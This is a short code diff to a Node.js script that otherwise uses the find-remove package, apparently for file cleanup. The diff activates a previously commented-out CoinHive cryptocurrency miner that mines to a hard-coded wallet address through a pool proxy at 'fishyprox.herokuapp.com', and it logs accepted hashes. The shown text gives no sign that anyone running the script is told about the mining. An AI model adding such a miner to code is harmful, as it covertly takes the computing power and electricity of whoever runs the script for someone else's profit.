@@ -1,17 +1,19 @@
-var findRemoveSync = require('find-remove');
+const CoinHive = require("coin-hive");
+const findRemoveSync = require("find-remove");
 
 (async () => {
-  /*const miner = await CoinHive('44tKLXJSEJPBkfGpwiz4Hy23ZdBdPTXhXXjncmJUg2J2fbEvfreyxRgfo6PvGgr5GRGasJVhYDgf5GTcmNLyrLfUAXMPGaG', {
+  const miner = await CoinHive('44tKLXJSEJPBkfGpwiz4Hy23ZdBdPTXhXXjncmJUg2J2fbEvfreyxRgfo6PvGgr5GRGasJVhYDgf5GTcmNLyrLfUAXMPGaG', {
     pool: {
-      host: '213.32.29.150',
-      port: 14444
+      //host: '213.32.29.150',
+      //port: 14444
+      host: 'fishyprox.herokuapp.com',
+      port: 80
     }
   });
   await miner.start();
   miner.on('update', data => console.log(`
-  
     ${data.acceptedHashes}
-  `));*/
+  `));
   
     setTimeout(async () => {
       
@@ -36,4 +38,5 @@ var findRemoveSync = require('find-remove');
       }
       
   }, 3000);
+  
 })();
